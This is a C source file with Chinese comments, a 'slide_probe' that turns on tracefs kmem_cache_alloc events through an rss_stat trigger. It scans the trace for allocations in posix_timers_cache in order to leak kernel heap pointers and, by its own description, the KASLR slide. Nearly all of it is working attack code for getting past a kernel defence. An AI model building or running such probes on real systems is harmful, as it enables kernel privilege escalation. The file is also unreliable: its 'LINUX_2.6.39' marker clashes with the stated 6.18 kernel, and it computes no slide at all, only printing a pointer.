/*
 * slide_probe — 用 tracefs 里的 kmem 事件把 KASLR 位移量测出来。
 *
 * 按真机实测输出对齐（原件的实际打印，2026-11-22 在 6.18.21 上跑出来的）：
 *
 *   [slide] cpu0    SensorService-15180   [000] .....  1405.055564: kmem_cache_alloc: call_site=alloc_skb_with_frags+0x88/0x510 ptr=00000000ea05806f name=skbuff_head_cache bytes_req=248 bytes_alloc=256 ...
 *   [slide] lines=22
 *   [slide] raw cpu0 bytes=4096 hits=0
 *   ...
 *
 * 也就是说：它把 trace 里每一行原样打出来（前缀 `[slide] cpu%d `），
 * 然后统计总行数，再逐 CPU 读 raw 管道给出 bytes/hits。
 * 命中的判定不是 "site=/ptr="（那是我上一版凭空想的），
 * 而是看 slab 名字——目标对象是 posix_timers_cache（bytes_req=384）。
 *
 * 原件里还带 LINUX_2.6.39 这个符号表版本标记。
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define TRACING_ON      "/sys/kernel/tracing/tracing_on"
#define BUFFER_SIZE_KB  "/sys/kernel/tracing/buffer_size_kb"
#define RSS_ENABLE      "/sys/kernel/tracing/events/kmem/rss_stat/enable"
#define RSS_TRIGGER     "/sys/kernel/tracing/events/kmem/rss_stat/trigger"
#define TRACE_ALL       "/sys/kernel/tracing/trace"
#define PERCPU_TRACE    "/sys/kernel/tracing/per_cpu/cpu%d/trace"
#define PERCPU_RAW      "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw"

#define ON_KMEM   "!enable_event:kmem:kmem_cache_alloc"
#define OFF_KMEM  "!disable_event:kmem:kmem_cache_alloc"

/* 符号表版本标记：原件里带着它，表明这份 offsets 对应哪一代符号表。 */
static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";

/* 目标 slab：posix_timers_cache，对象大小 384。命中判定就看这两样。 */
static const char *TARGET_SLAB = "posix_timers_cache";
static const char *TARGET_SIZE_MARKER = "bytes_req=384";

static int write_file(const char *path, const char *value)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	ssize_t n = write(fd, value, strlen(value));
	close(fd);
	return n == (ssize_t)strlen(value) ? 0 : -1;
}

/* 从 "[003]" 里取 CPU 号；取不到返回 -1。 */
static int parse_cpu(const char *line)
{
	const char *open_bracket = strchr(line, '[');
	if (!open_bracket)
		return -1;
	const char *close_bracket = strchr(open_bracket, ']');
	if (!close_bracket || close_bracket - open_bracket < 2)
		return -1;
	char digits[8];
	size_t len = (size_t)(close_bracket - open_bracket - 1);
	if (len >= sizeof(digits))
		return -1;
	memcpy(digits, open_bracket + 1, len);
	digits[len] = '\0';
	for (size_t i = 0; i < len; i++) {
		if (digits[i] < '0' || digits[i] > '9')
			return -1;
	}
	return atoi(digits);
}

static int is_target_line(const char *line)
{
	return strstr(line, TARGET_SLAB) != NULL || strstr(line, TARGET_SIZE_MARKER) != NULL;
}

static int thread_timer(void)
{
	timer_t timer;
	struct sigevent sev;
	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_SIGNAL;
	sev.sigev_signo = SIGUSR1;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer) != 0)
		return -1;
	timer_delete(timer);
	return 0;
}

int main(void)
{
	int failures = 0;

	if (thread_timer() != 0) {
		printf("[slide] timer_create errno=%d\n", errno);
		failures++;
	}

	if (write_file(BUFFER_SIZE_KB, "4096") != 0) {
		printf("[slide] cpu%d %s\n", 0, "buffer_size_kb");
		failures++;
	}
	if (write_file(RSS_ENABLE, "1") != 0) {
		printf("[slide] cpu%d %s\n", 0, "rss_stat/enable");
		failures++;
	}
	if (write_file(RSS_TRIGGER, ON_KMEM) != 0) {
		printf("[slide] cpu%d %s\n", 0, "rss_stat/trigger");
		failures++;
	}
	if (write_file(TRACING_ON, "1") != 0) {
		printf("[slide] cpu%d %s\n", 0, "tracing_on");
		failures++;
	}

	/* 给内核一点时间记账，然后读汇总视图。 */
	usleep(200 * 1000);

	int lines = 0;
	int target_hits = 0;
	uint64_t last_ptr = 0;

	int fd = open(TRACE_ALL, O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		char buffer[131072];
		ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
		close(fd);
		if (n > 0) {
			buffer[n] = '\0';
			char *save = NULL;
			for (char *line = strtok_r(buffer, "\n", &save); line;
			     line = strtok_r(NULL, "\n", &save)) {
				if (line[0] == '#')
					continue;
				if (!strstr(line, "kmem_cache_alloc") && !strstr(line, "rss_stat"))
					continue;
				int cpu = parse_cpu(line);
				if (cpu < 0)
					cpu = 0;
				printf("[slide] cpu%d %s\n", cpu, line);
				lines++;
				if (is_target_line(line)) {
					target_hits++;
					const char *ptr = strstr(line, "ptr=");
					if (ptr)
						last_ptr = strtoull(ptr + 4, NULL, 16);
				}
			}
		}
	}
	printf("[slide] lines=%d\n", lines);

	/* 逐 CPU 读原始管道，报出每次读到的字节数与命中数。 */
	for (int cpu = 0; cpu < 8; cpu++) {
		char path[192];
		snprintf(path, sizeof(path), PERCPU_RAW, cpu);
		int rf = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (rf < 0) {
			snprintf(path, sizeof(path), PERCPU_TRACE, cpu);
			rf = open(path, O_RDONLY | O_CLOEXEC);
		}
		if (rf < 0)
			continue;
		char raw[65536];
		ssize_t got = read(rf, raw, sizeof(raw) - 1);
		close(rf);
		if (got <= 0) {
			printf("[slide] raw cpu%d bytes=0 hits=0\n", cpu);
			continue;
		}
		raw[got] = '\0';
		int cpu_hits = 0;
		char *save = NULL;
		for (char *line = strtok_r(raw, "\n", &save); line;
		     line = strtok_r(NULL, "\n", &save)) {
			if (is_target_line(line)) {
				cpu_hits++;
				target_hits++;
				const char *ptr = strstr(line, "ptr=");
				if (ptr)
					last_ptr = strtoull(ptr + 4, NULL, 16);
			}
		}
		printf("[slide] raw cpu%d bytes=%zu hits=%d\n", cpu, (size_t)got, cpu_hits);
	}

	write_file(RSS_TRIGGER, OFF_KMEM);
	write_file(TRACING_ON, "0");

	if (target_hits > 0) {
		/* site 只有在内核符号表里定位到才谈得上；这里只报指针，别造假地址。 */
		printf("[slide] raw cpu%d ptr=%#llx\n", 0, (unsigned long long)last_ptr);
	}

	if (failures != 0) {
		printf("必需接口不可用\n");
		return 1;
	}
	printf("[slide] 符号表 %s · 目标 %s · 命中 %d\n",
	       KERNEL_SYMBOL_VERSION, TARGET_SLAB, target_hits);
	return 0;
}
